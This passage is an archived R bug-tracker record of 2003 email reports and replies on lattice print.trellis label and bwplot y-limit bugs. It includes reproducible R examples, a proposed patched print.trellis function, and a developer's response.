cm5hdGluZyA9PSAyIHwgeS5hbHRlcm5hdGluZyA9PSAzKSkgew0KICAgICAg
ICAgICAgICAgIGlmIChhYnMoeWF4aXMucm90WzJdKSA9PSA5MCkgew0KICAg
ICAgICAgICAgICAgICAgd2lkdGhzLmluc2VydGxpc3QucG9zaXRpb24gPC0g
Yyh3aWR0aHMuaW5zZXJ0bGlzdC5wb3NpdGlvbiwgDQogICAgICAgICAgICAg
ICAgICAgIG4uY29sIC0gMikNCiAgICAgICAgICAgICAgICAgIHdpZHRocy5p
bnNlcnRsaXN0LnVuaXQgPC0gdW5pdC5jKHdpZHRocy5pbnNlcnRsaXN0LnVu
aXQsIA0KICAgICAgICAgICAgICAgICAgICBtYXgodW5pdChyZXAoMSAqIHlh
eGlzLmNleFsyXSwgbGVuZ3RoKHN0cmJhcikpLCANCiAgICAgICAgICAgICAg
ICAgICAgICAic3RyaGVpZ2h0Iiwgc3RyYmFyKSkpDQogICAgICAgICAgICAg
ICAgfQ0KICAgICAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAg
ICAgd2lkdGhzLmluc2VydGxpc3QucG9zaXRpb24gPC0gYyh3aWR0aHMuaW5z
ZXJ0bGlzdC5wb3NpdGlvbiwgDQogICAgICAgICAgICAgICAgICAgIG4uY29s
IC0gMikNCiAgICAgICAgICAgICAgICAgIHdpZHRocy5pbnNlcnRsaXN0LnVu
aXQgPC0gdW5pdC5jKHdpZHRocy5pbnNlcnRsaXN0LnVuaXQsIA0KICAgICAg
ICAgICAgICAgICAgICBtYXgodW5pdChyZXAoMSAqIHlheGlzLmNleFsyXSAq
IGFicyhjb3MoeWF4aXMucm90WzJdICogDQogICAgICAgICAgICAgICAgICAg
ICAgYmFzZTo6cGkvMTgwKSksIGxlbmd0aChzdHJiYXIpKSwgInN0cndpZHRo
IiwgDQogICAgICAgICAgICAgICAgICAgICAgc3RyYmFyKSkpDQogICAgICAg
ICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAg
IGVsc2Ugew0KICAgICAgICAgICAgbGFiZWxDaGFycyA8LSBjaGFyYWN0ZXIo
MCkNCiAgICAgICAgICAgIGxhYmVsRXhwcnMgPC0gZXhwcmVzc2lvbigwKQ0K
ICAgICAgICAgICAgZm9yIChpIGluIHNlcShhbG9uZyA9IHgkeS5saW1pdHMp
KSB7DQogICAgICAgICAgICAgICAgbGFiIDwtIGNhbGN1bGF0ZUF4aXNDb21w
b25lbnRzKHggPSB4JHkubGltaXRzW1tpXV0sIA0KICAgICAgICAgICAgICAg
ICAgYXQgPSBpZiAoaXMubGlzdCh4JHkuc2NhbGVzJGF0KSkgDQogICAgICAg
ICAgICAgICAgICAgIHgkeS5zY2FsZXMkYXRbW2ldXQ0KICAgICAgICAgICAg
ICAgICAgZWxzZSB4JHkuc2NhbGVzJGF0LCBsYWJlbHMgPSBpZiAoaXMubGlz
dCh4JHkuc2NhbGVzJGxhYikpIA0KICAgICAgICAgICAgICAgICAgICB4JHku
c2NhbGVzJGxhYltbaV1dDQogICAgICAgICAgICAgICAgICBlbHNlIHgkeS5z
Y2FsZXMkbGFiLCBoYXZlLmxvZyA9IGhhdmUueWxvZywgDQogICAgICAgICAg
ICAgICAgICBsb2diYXNlID0geWxvZ2Jhc2UsIGxvZ3Bhc3RlID0geWxvZ3Bh
c3RlLCBhYmJyZXZpYXRlID0geCR5LnNjYWxlcyRhYmJyLCANCiAgICAgICAg
ICAgICAgICAgIG1pbmxlbmd0aCA9IHgkeS5zY2FsZXMkbWlubCwgbiA9IHgk
eS5zY2FsZXMkdGljay5udW1iZXIpJGxhYg0KICAgICAgICAgICAgICAgIGlm
IChpcy5jaGFyYWN0ZXIobGFiKSkgDQogICAgICAgICAgICAgICAgICBsYWJl

==> 2859.followup.1 <==
From mailnull@stat.math.ethz.ch Sun Apr 27 16:44:01 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3REi0pD003346
	for <R-bugs@biostat.ku.dk>; Sun, 27 Apr 2003 16:44:00 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3REhvbj013995
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Sun, 27 Apr 2003 16:43:57 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h3REhvfb013971
	for R-bugs@biostat.ku.dk; Sun, 27 Apr 2003 16:43:57 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3REhgbi013939
	for <r-bugs@lists.r-project.org>; Sun, 27 Apr 2003 16:43:43 +0200 (MEST)
Received: from surfer.sbm.temple.edu ([155.247.185.2])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 199nNW-0000Co-00
	for <r-bugs@r-project.org>; Sun, 27 Apr 2003 09:43:42 -0500
Received: (from rmh@localhost)
	by surfer.sbm.temple.edu (8.12.8p1/8.12.8) id h3REh61C2644022;
	Sun, 27 Apr 2003 10:43:06 -0400 (EDT)
Date: Sun, 27 Apr 2003 10:43:06 -0400 (EDT)
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Message-Id: <200304271443.h3REh61C2644022@surfer.sbm.temple.edu>
To: r-bugs@r-project.org
Subject: Re: [Rd] bug and proposed fix in print.trellis 1.7.0 (PR#2859)
Cc: rmh@surfer.sbm.temple.edu
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=-0.9 required=5.0 tests=QUOTED_EMAIL_TEXT,WEIRD_QUOTING version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

sent again without attachments at Peter Dalgaard's request

description:
# Your mailer is set to "none" (default on Windows),
# hence we cannot send the bug report directly from R.
# Please copy the bug report (after finishing it) to
# your favorite email program and send it to
#
#       r-bugs@r-project.org
#
######################################################


The new feature described in rw1070/library/lattice/Changes is very
useful and is needed for several of the examples I showed at DSC-2003.

> scales
> ------
> In anticipation of future use (in nlme, for example), the at and
> labels components of scales can now be a list. Each element
> corresponds to a panel. This is thoroughly untested and not guaranteed
> to work.

It currently rejects correctly formed user labels.  I attach an
example of the problem and a proposed fix.

Rich

--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = i386
 os = mingw32
 system = i386, mingw32
 status = 
 major = 1
 minor = 7.0
 year = 2003
 month = 04
 day = 16
 language = R

Windows XP Home Edition (build 2600) Service Pack 1.0

Search Path:
 .GlobalEnv, file:c:/HOME/rmh/hh/splus.library/.RData, package:grid, package:lattice, package:methods, package:ctest, package:mva, package:modreg, package:nls, package:ts, Autoloads, package:base


example:
## print.trellis bug in R 1.7.0

tmp <- data.frame(a=factor(c("a","b","c")),
                  b=factor(c("d","e","f")),
                  d=factor(c(1,1,2)))

xyplot(a ~ b | d, data=tmp,  ## works
        scales=list(alternating=F))

xyplot(a ~ b | d, data=tmp,  ## Invalid value for labels
       scales=list(x=list(labels=list(c("d","e",""),c("","","f")),
                     alternating=F)))

source("print.trellis.r")    ## rmh proposed fix

xyplot(a ~ b | d, data=tmp,  ## now it works
       scales=list(x=list(labels=list(c("d","e",""),c("","","f")),
                     alternating=F)))




proposed fix:
print.trellis <-
function (x, position, split, more = FALSE, newpage = TRUE, panel.height = list(1, 
    "null"), panel.width = list(1, "null"), ...) 
{
    if (is.null(dev.list())) 
        trellis.device()
    else if (is.null(trellis.par.get())) 
        trellis.device(device = .Device, new = FALSE)
    bg = trellis.par.get("background")$col
    new <- TRUE
    if (.lattice.print.more || !newpage) 
        new <- FALSE
    .lattice.print.more <<- more
    usual <- (missing(position) & missing(split))
    fontsize.default <- trellis.par.get("fontsize")$default
    if (!missing(position)) {
        if (length(position) != 4) 
            stop("Incorrect value of position")
        if (new) {
            grid.newpage()
            grid.rect(gp = gpar(fill = bg, col = "transparent"))
        }
        push.viewport(viewport(x = position[1], y = position[2], 
            width = position[3] - position[1], height = position[4] - 
                position[2], just = c("left", "bottom")))
        if (!missing(split)) {
            if (length(split) != 4) 
                stop("Incorrect value of split")
            push.viewport(viewport(layout = grid.layout(nrow = split[4], 
                ncol = split[3])))
            push.viewport(viewport(layout.pos.row = split[2], 
                layout.pos.col = split[1]))
        }
    }
    else if (!missing(split)) {
        if (length(split) != 4) 
            stop("Incorrect value of split")
        if (new) {
            grid.newpage()
            grid.rect(gp = gpar(fill = bg, col = "transparent"))
        }
        push.viewport(viewport(layout = grid.layout(nrow = split[4], 
            ncol = split[3])))
        push.viewport(viewport(layout.pos.row = split[2], layout.pos.col = split[1]))
    }
    panel <- if (is.function(x$panel)) 
        x$panel
    else if (is.character(x$panel)) 
        get(x$panel)
    else eval(x$panel)
    x$strip <- if (is.function(x$strip)) 
        x$strip
    else if (is.character(x$strip)) 
        get(x$strip)
    else eval(x$strip)
    axis.line <- trellis.par.get("axis.line")
    number.of.cond <- length(x$condlevels)
    layout.respect <- !x$aspect.fill
    if (layout.respect) 
        panel.height[[1]] <- x$aspect.ratio * panel.width[[1]]
    if (!is.null(x$key)) {
        key.gf <- draw.key(x$key)
        key.space <- if ("space" %in% names(x$key)) 
            x$key$space
        else if ("x" %in% names(x$key) || "corner" %in% names(x$key)) 
            "inside"
        else "top"
    }
    else if (!is.null(x$colorkey)) {
        key.gf <- draw.colorkey(x$colorkey)
        key.space <- if ("space" %in% names(x$colorkey)) 
            x$colorkey$space
        else "right"
    }
    xaxis.col <- if (is.logical(x$x.scales$col)) 
        axis.line$col
    else x$x.scales$col
    xaxis.font <- if (is.logical(x$x.scales$font)) 
        1
    else x$x.scales$font
    xaxis.cex <- x$x.scales$cex
    xaxis.rot <- if (is.logical(x$x.scales$rot)) 
        c(0, 0)
    else x$x.scales$rot
    yaxis.col <- if (is.logical(x$y.scales$col)) 
        axis.line$col
    else x$y.scales$col
    yaxis.font <- if (is.logical(x$y.scales$font)) 
        1
    else x$y.scales$font
    yaxis.cex <- x$y.scales$cex
    yaxis.rot <- if (!is.logical(x$y.scales$rot)) 
        x$y.scales$rot
    else if (x$y.scales$relation != "same" && is.logical(x$y.scales$labels)) 
        c(90, 90)
    else c(0, 0)
    strip.col.default.bg <- rep(trellis.par.get("strip.background")$col, 
        length = number.of.cond)
    strip.col.default.fg <- rep(trellis.par.get("strip.shingle")$col, 
        length = number.of.cond)
    cond.max.level <- integer(number.of.cond)
    for (i in 1:number.of.cond) {
        cond.max.level[i] <- length(x$condlevels[[i]])
    }
    if (x$layout[1] == 0) {
        ddim <- par("din")
        device.aspect <- ddim[2]/ddim[1]
        panel.aspect <- panel.height[[1]]/panel.width[[1]]
        plots.per.page <- x$layout[2]
        m <- max(1, round(sqrt(x$layout[2] * device.aspect/panel.aspect)))
        n <- ceiling(plots.per.page/m)
        m <- ceiling(plots.per.page/n)
        x$layout[1] <- n
        x$layout[2] <- m
    }
    else plots.per.page <- x$layout[1] * x$layout[2]
    cols.per.page <- x$layout[1]
    rows.per.page <- x$layout[2]
    number.of.pages <- x$layout[3]
    if (cols.per.page > 1) 
        x.between <- rep(x$x.between, length = cols.per.page - 
            1)
    if (rows.per.page > 1) 
        y.between <- rep(x$y.between, length = rows.per.page - 
            1)
    x.alternating <- rep(x$x.scales$alternating, length = cols.per.page)
    y.alternating <- rep(x$y.scales$alternating, length = rows.per.page)
    x.relation.same <- x$x.scales$relation == "same"
    y.relation.same <- x$y.scales$relation == "same"
    xlog <- x$x.scales$log
    ylog <- x$y.scales$log
    if (is.logical(xlog) && xlog) 
        xlog <- 10
    if (is.logical(ylog) && ylog) 
        ylog <- 10
    have.xlog <- !is.logical(xlog) || xlog
    have.ylog <- !is.logical(ylog) || ylog
    xlogbase <- if (is.numeric(xlog)) 
        xlog
    else exp(1)
    ylogbase <- if (is.numeric(ylog)) 
        ylog
    else exp(1)
    xlogpaste <- if (have.xlog) 
        paste(as.character(xlog), "^", sep = "")
    else ""
    ylogpaste <- if (have.ylog) 
        paste(as.character(ylog), "^", sep = "")
    else ""
    have.main <- !(is.null(x$main$label) || (is.character(x$main$label) && 
        x$main$label == ""))
    have.sub <- !(is.null(x$sub$label) || (is.character(x$sub$label) && 
        x$sub$label == ""))
    have.xlab <- !(is.null(x$xlab$label) || (is.character(x$xlab$label) && 
        x$xlab$label == ""))
    have.ylab <- !(is.null(x$ylab$label) || (is.character(x$ylab$label) && 
        x$ylab$label == ""))
    n.row <- rows.per.page * (number.of.cond + 3) + (rows.per.page - 
        1) + 11
    n.col <- 3 * cols.per.page + (cols.per.page - 1) + 9
    if (layout.respect) {
        layout.respect <- matrix(0, n.row, n.col)
        layout.respect[number.of.cond + 6 + (1:rows.per.page - 
            1) * (number.of.cond + 4), (1:cols.per.page - 1) * 
            4 + 8] <- 1
    }
    heights.x <- rep(1, n.row)
    heights.units <- rep("lines", n.row)
    heights.data <- as.list(1:n.row)
    widths.x <- rep(1, n.col)
    widths.units <- rep("lines", n.col)
    widths.data <- as.list(1:n.col)
    heights.x[number.of.cond + 6 + (1:rows.per.page - 1) * (number.of.cond + 
        4)] <- panel.height[[1]]
    heights.units[number.of.cond + 6 + (1:rows.per.page - 1) * 
        (number.of.cond + 4)] <- panel.height[[2]]
    heights.x[number.of.cond + 7 + (1:rows.per.page - 1) * (number.of.cond + 
        4)] <- 0
    heights.x[number.of.cond + 8 + (1:rows.per.page - 1) * (number.of.cond + 
        4)] <- 0
    heights.x[4] <- 0
    heights.x[5] <- 0
    heights.x[n.row - 4] <- 0
    heights.x[n.row - 5] <- 0
    if (rows.per.page > 1) 
        heights.x[number.of.cond + 9 + ((if (x$as.table) 
            1:(rows.per.page - 1)
        else (rows.per.page - 1):1) - 1) * (number.of.cond + 
            4)] <- y.between
    heights.x[1] <- 0.5
    heights.x[2] <- if (have.main) 
        2 * x$main$cex
    else 0
    if (have.main) {
        heights.units[2] <- "strheight"
        heights.data[[2]] <- x$main$lab
    }
    heights.x[n.row] <- 0.5
    heights.x[n.row - 1] <- if (have.sub) 
        2 * x$sub$cex
    else 0
    if (have.sub) {
        heights.units[n.row - 1] <- "strheight"
        heights.data[[n.row - 1]] <- x$sub$lab
    }
    heights.x[3] <- 0
    heights.x[n.row - 2] <- 0
    heights.insertlist.position <- 0
    heights.insertlist.unit <- unit(1, "null")
    if (x$x.scales$draw) {
        if (x.relation.same) {
            lab <- calculateAxisComponents(x = x$x.limits, at = x$x.scales$at, 
                labels = x$x.scales$lab, have.log = have.xlog, 
                logbase = xlogbase, logpaste = xlogpaste, abbreviate = x$x.scales$abbr, 
                minlength = x$x.scales$minl, n = x$x.scales$tick.number)$lab
##          if (is.character(lab)) 
            if (all(sapply(lab, is.character)))  ## rmh
                strbar <- as.list(lab)
            else if (is.expression(lab)) {
                strbar <- list()
                for (ss in seq(along = lab)) strbar <- c(strbar, 
                  list(lab[ss]))
            }
            else stop("Invalid value for labels")
            heights.x[5] <- 0.5 + max(0.001, x$x.scales$tck[2]) * 
                0.3
            heights.x[n.row - 5] <- 0.5 + max(0.001, x$x.scales$tck[1]) * 
                0.3
            if (any(x.alternating == 2 | x.alternating == 3)) {
                if (xaxis.rot[2] %in% c(0, 180)) {
                  heights.insertlist.position <- c(heights.insertlist.position, 
                    4)
                  heights.insertlist.unit <- unit.c(heights.insertlist.unit, 
                    max(unit(rep(1 * xaxis.cex[2], length(strbar)), 
                      "strheight", strbar)))
                }
                else {
                  heights.insertlist.position <- c(heights.insertlist.position, 
                    4)
                  heights.insertlist.unit <- unit.c(heights.insertlist.unit, 
                    max(unit(rep(1 * xaxis.cex[2] * abs(sin(xaxis.rot[2] * 
                      base::pi/180)), length(strbar)), "strwidth", 
                      strbar)))
                }
            }
            if (any(x.alternating == 1 | x.alternating == 3)) {
                if (xaxis.rot[1] %in% c(0, 180)) {
                  heights.insertlist.position <- c(heights.insertlist.position, 
                    n.row - 4)
                  heights.insertlist.unit <- unit.c(heights.insertlist.unit, 
                    max(unit(rep(1 * xaxis.cex[1], length(strbar)), 
                      "strheight", strbar)))
                }
                else {
                  heights.insertlist.position <- c(heights.insertlist.position, 
                    n.row - 4)
                  heights.insertlist.unit <- unit.c(heights.insertlist.unit, 
                    max(unit(rep(1 * xaxis.cex[1] * abs(sin(xaxis.rot[1] * 
                      base::pi/180)), length(strbar)), "strwidth", 
                      strbar)))
                }
            }
        }
        else {
            labelChars <- character(0)
            labelExprs <- expression(0)
            for (i in seq(along = x$x.limits)) {
                lab <- calculateAxisComponents(x = x$x.limits[[i]], 
                  at = if (is.list(x$x.scales$at)) 
                    x$x.scales$at[[i]]
                  else x$x.scales$at, labels = if (is.list(x$x.scales$lab)) 
                    x$x.scales$lab[[i]]
                  else x$x.scales$lab, have.log = have.xlog, 
                  logbase = xlogbase, logpaste = xlogpaste, abbreviate = x$x.scales$abbr, 
                  minlength = x$x.scales$minl, n = x$x.scales$tick.number)$lab
                if (is.character(lab)) 
                  labelChars <- c(labelChars, lab)
                else if (is.expression(lab)) 
                  labelExprs <- c(labelExprs, lab)
            }
            labelChars <- unique(labelChars)
            strbar <- list()
            for (ss in labelChars) strbar <- c(strbar, list(ss))
            for (ss in seq(along = labelExprs)) strbar <- c(strbar, 
                list(labelExprs[ss]))
            if (xaxis.rot[1] %in% c(0, 180)) {
                heights.x[number.of.cond + 7 + (1:rows.per.page - 
                  1) * (number.of.cond + 4)] <- max(0.001, x$x.scales$tck[1]) * 
                  0.3
                heights.insertlist.position <- c(heights.insertlist.position, 
                  number.of.cond + 8 + (1:rows.per.page - 1) * 
                    (number.of.cond + 4))
                for (i in 1:rows.per.page) heights.insertlist.unit <- unit.c(heights.insertlist.unit, 
                  max(unit(rep(1.5 * xaxis.cex[1], length(strbar)), 
                    "strheight", strbar)))
            }
            else {
                heights.x[number.of.cond + 7 + (1:rows.per.page - 
                  1) * (number.of.cond + 4)] <- max(0.001, x$x.scales$tck[1]) * 
                  0.3
                heights.insertlist.position <- c(heights.insertlist.position, 
                  number.of.cond + 8 + (1:rows.per.page - 1) * 
                    (number.of.cond + 4))
                for (i in 1:rows.per.page) heights.insertlist.unit <- unit.c(heights.insertlist.unit, 
                  max(unit(rep(1.5 * xaxis.cex[1] * abs(sin(xaxis.rot[1] * 
                    base::pi/180)), length(strbar)), "strwidth", 
                    strbar)))
            }
        }
    }
    heights.x[n.row - 3] <- if (have.xlab) 
        2 * x$xlab$cex
    else 0
    if (have.xlab) {
        heights.units[n.row - 3] <- "strheight"
        heights.data[[n.row - 3]] <- x$xlab$lab
    }
    for (crr in 1:number.of.cond) heights.x[number.of.cond + 
        6 + (1:rows.per.page - 1) * (number.of.cond + 4) - crr] <- if (is.logical(x$strip)) 
        0
    else 1.1 * x$par.strip.text$cex * x$par.strip.text$lines
    widths.x[3] <- if (have.ylab) 
        2 * x$ylab$cex
    else 0
    if (have.ylab) {
        widths.units[3] <- "strheight"
        widths.data[[3]] <- x$ylab$lab
    }
    widths.x[(1:cols.per.page - 1) * 4 + 8] <- panel.width[[1]]
    widths.units[(1:cols.per.page - 1) * 4 + 8] <- panel.width[[2]]
    widths.x[(1:cols.per.page - 1) * 4 + 7] <- 0
    widths.x[(1:cols.per.page - 1) * 4 + 6] <- 0
    widths.x[4] <- 0
    widths.x[5] <- 0
    widths.x[n.col - 2] <- 0
    widths.x[n.col - 3] <- 0
    if (cols.per.page > 1) 
        widths.x[(1:(cols.per.page - 1) - 1) * 4 + 9] <- x.between
    widths.x[1] <- 0.5
    widths.x[n.col] <- 0.5
    widths.x[2] <- 0
    widths.x[n.col - 1] <- 0
    widths.insertlist.position <- 0
    widths.insertlist.unit <- unit(1, "null")
    if (x$y.scales$draw) {
        if (y.relation.same) {
            lab <- calculateAxisComponents(x = x$y.limits, at = x$y.scales$at, 
                labels = x$y.scales$lab, have.log = have.ylog, 
                logbase = ylogbase, logpaste = ylogpaste, abbreviate = x$y.scales$abbr, 
                minlength = x$y.scales$minl, n = x$y.scales$tick.number)$lab
##          if (is.character(lab)) 
            if (all(sapply(lab, is.character)))  ## rmh
                strbar <- as.list(lab)
            else if (is.expression(lab)) {
                strbar <- list()
                for (ss in seq(along = lab)) strbar <- c(strbar, 
                  list(lab[ss]))
            }
            else stop("Invalid value for labels")
            widths.x[5] <- 0.5 + max(0.001, x$y.scales$tck[1]) * 
                0.3
            widths.x[n.col - 3] <- max(1, x$y.scales$tck[2]) * 
                0.5
            if (any(y.alternating == 1 | y.alternating == 3)) {
                if (abs(yaxis.rot[1]) == 90) {
                  widths.insertlist.position <- c(widths.insertlist.position, 
                    4)
                  widths.insertlist.unit <- unit.c(widths.insertlist.unit, 
                    max(unit(1 * rep(yaxis.cex[1], length(strbar)), 
                      "strheight", data = strbar)))
                }
                else {
                  widths.insertlist.position <- c(widths.insertlist.position, 
                    4)
                  widths.insertlist.unit <- unit.c(widths.insertlist.unit, 
                    max(unit(rep(1 * yaxis.cex[1] * abs(cos(yaxis.rot[1] * 
                      base::pi/180)), length(strbar)), "strwidth", 
                      strbar)))
                }
            }
            if (any(y.alternating == 2 | y.alternating == 3)) {
                if (abs(yaxis.rot[2]) == 90) {
                  widths.insertlist.position <- c(widths.insertlist.position, 
                    n.col - 2)
                  widths.insertlist.unit <- unit.c(widths.insertlist.unit, 
                    max(unit(rep(1 * yaxis.cex[2], length(strbar)), 
                      "strheight", strbar)))
                }
                else {
                  widths.insertlist.position <- c(widths.insertlist.position, 
                    n.col - 2)
                  widths.insertlist.unit <- unit.c(widths.insertlist.unit, 
                    max(unit(rep(1 * yaxis.cex[2] * abs(cos(yaxis.rot[2] * 
                      base::pi/180)), length(strbar)), "strwidth", 

==> 2859.audit <==
Tue Apr 29 10:53:09 2003	ripley	changed notes
Tue Apr 29 10:53:09 2003	ripley	foobar
Tue Apr 29 10:53:09 2003	ripley	moved from incoming to Add-ons

==> 2859.followup.2 <==
From deepayan@stat.wisc.edu Tue May 13 22:26:55 2003
Received: from sabe.cs.wisc.edu (sabe.cs.wisc.edu [128.105.6.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4DKQs2b001914
	for <R-bugs@biostat.ku.dk>; Tue, 13 May 2003 22:26:54 +0200 (MET DST)
Received: from 192.168.0.114 (66-188-128-48.mad.wi.charter.com [66.188.128.48])
	(authenticated (0 bits))
	by sabe.cs.wisc.edu (8.11.3/8.11.3) with ESMTP id h4DKQot21116
	(using TLSv1/SSLv3 with cipher RC4-MD5 (128 bits) verified NO);
	Tue, 13 May 2003 15:26:50 -0500
From: Deepayan Sarkar <deepayan@stat.wisc.edu>
To: rmh@surfer.sbm.temple.edu
Subject: Re: [Rd] bug and proposed fix in print.trellis 1.7.0 (PR#2859)
Date: Tue, 13 May 2003 15:27:05 -0500
User-Agent: KMail/1.5.1
Cc: R-bugs@biostat.ku.dk
References: <200304271444.h3REi9pD003350@pubhealth.ku.dk>
In-Reply-To: <200304271444.h3REi9pD003350@pubhealth.ku.dk>
MIME-Version: 1.0
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Message-Id: <200305131527.05339.deepayan@stat.wisc.edu>


Hi,

sorry for the delay, I didn't have time to look at this earlier.

On Sunday 27 April 2003 09:44, rmh@surfer.sbm.temple.edu wrote:

> The new feature described in rw1070/library/lattice/Changes is very
> useful and is needed for several of the examples I showed at DSC-2003.
>
> > scales
> > ------
> > In anticipation of future use (in nlme, for example), the at and
> > labels components of scales can now be a list. Each element
> > corresponds to a panel. This is thoroughly untested and not guaranteed
> > to work.

It's not at all clear from this entry, but I meant to do this only when 
relation="free" or "sliced" in scales, because those are the only cases in 
which different tick positions and labels can be guaranteed to be associated 
with each panel. In the relation = "same" case, changing the layout changes 
which labels go with which panel (and if alternating = 0 or 3, it's even 
ambiguous).

I notice now that your first example (with the 'at' but no 'labels') does 
produce some output that seems to take the list into account, but that was 
unintended. My preference would be to produce an error in such cases, but I'm 
open to other suggestions.

Do you really need this ? I think relation="free" would suit your purpose 
quite well, at least in the given example. Perhaps I could additionally allow 
'limits' (which is ignored now for relation="free") to be a list as well.

Deepayan


> It currently rejects correctly formed user labels.  I attach an
> example of the problem and a proposed fix.
>
> Rich
>
> --please do not edit the information below--
>
> Version:
>  platform = i386-pc-mingw32
>  arch = i386
>  os = mingw32
>  system = i386, mingw32
>  status =
>  major = 1
>  minor = 7.0
>  year = 2003
>  month = 04
>  day = 16
>  language = R
>
> Windows XP Home Edition (build 2600) Service Pack 1.0
>
> Search Path:
>  .GlobalEnv, file:c:/HOME/rmh/hh/splus.library/.RData, package:grid,
> package:lattice, package:methods, package:ctest, package:mva,
> package:modreg, package:nls, package:ts, Autoloads, package:base
>
>
> example:
> ## print.trellis bug in R 1.7.0
>
> tmp <- data.frame(a=factor(c("a","b","c")),
>                   b=factor(c("d","e","f")),
>                   d=factor(c(1,1,2)))
>
> xyplot(a ~ b | d, data=tmp,  ## works
>         scales=list(alternating=F))
>
> xyplot(a ~ b | d, data=tmp,  ## Invalid value for labels
>        scales=list(x=list(labels=list(c("d","e",""),c("","","f")),
>                      alternating=F)))
>
> source("print.trellis.r")    ## rmh proposed fix
>
> xyplot(a ~ b | d, data=tmp,  ## now it works
>        scales=list(x=list(labels=list(c("d","e",""),c("","","f")),
>                      alternating=F)))



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2865 *
Subject: bug in y limits in bwplot
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Date: Mon, 28 Apr 2003 02:19:53 -0400 (EDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2865 <==
From mailnull@stat.math.ethz.ch Mon Apr 28 08:20:38 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3S6KcpD006491
	for <R-bugs@biostat.ku.dk>; Mon, 28 Apr 2003 08:20:38 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3S6KZbj016116
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Mon, 28 Apr 2003 08:20:35 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h3S6KYeM016115
	for R-bugs@biostat.ku.dk; Mon, 28 Apr 2003 08:20:34 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3S6KTbi016095
	for <r-bugs@lists.r-project.org>; Mon, 28 Apr 2003 08:20:30 +0200 (MEST)
Received: from surfer.sbm.temple.edu ([155.247.185.2])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19A205-0008Hy-00
	for <r-bugs@r-project.org>; Mon, 28 Apr 2003 01:20:29 -0500
Received: (from rmh@localhost)
	by surfer.sbm.temple.edu (8.12.8p1/8.12.8) id h3S6JrAx2647908;
	Mon, 28 Apr 2003 02:19:53 -0400 (EDT)
Date: Mon, 28 Apr 2003 02:19:53 -0400 (EDT)
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Message-Id: <200304280619.h3S6JrAx2647908@surfer.sbm.temple.edu>
To: r-bugs@r-project.org
Subject: bug in y limits in bwplot
Cc: rmh@surfer.sbm.temple.edu
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=0.0 required=5.0 tests=none version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

# Your mailer is set to "none" (default on Windows),
# hence we cannot send the bug report directly from R.
# Please copy the bug report (after finishing it) to
# your favorite email program and send it to
#
#       r-bugs@r-project.org
#
######################################################

## bug in y limits in bwplot

tmp <- data.frame(y=1:10, a=factor(rep(1:2,5)))

## x limits in bwplot works as expected
bwplot(y ~ a, data=tmp, horizontal=F)  # works

bwplot(y ~ a, data=tmp, horizontal=F,  # works
       xlim=c(-1,5))

bwplot(y ~ a, data=tmp, horizontal=F,  # works
       scales=list(x=list(limits=c(-1,5))))


## problem with y limits in bwplot
bwplot(a ~ y, data=tmp, horizontal=T)  # works

bwplot(a ~ y, data=tmp, horizontal=T,  # works
       ylim=c(-1,5))

bwplot(a ~ y, data=tmp, horizontal=T,  # error message
       scales=list(y=list(limits=c(-1,5))))


## transcript with error message
> bwplot(a ~ y, data=tmp, horizontal=T,  # error message
+        scales=list(y=list(limits=c(-1,5))))
Error in print.trellis(structure(list(as.table = FALSE, aspect.fill = TRUE,  : 
	Invalid value for labels
In addition: Warning message: 
is.na() applied to non-(list or vector) in: is.na(x) 
> 





--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = i386
 os = mingw32
 system = i386, mingw32
 status = 
 major = 1
 minor = 7.0
 year = 2003
 month = 04
 day = 16
 language = R

Windows XP Home Edition (build 2600) Service Pack 1.0

Search Path:
 .GlobalEnv, package:grid, package:lattice, package:methods, package:ctest, package:mva, package:modreg, package:nls, package:ts, Autoloads, package:base


==> 2865.audit <==
Tue Apr 29 10:54:47 2003	ripley	moved from incoming to Add-ons

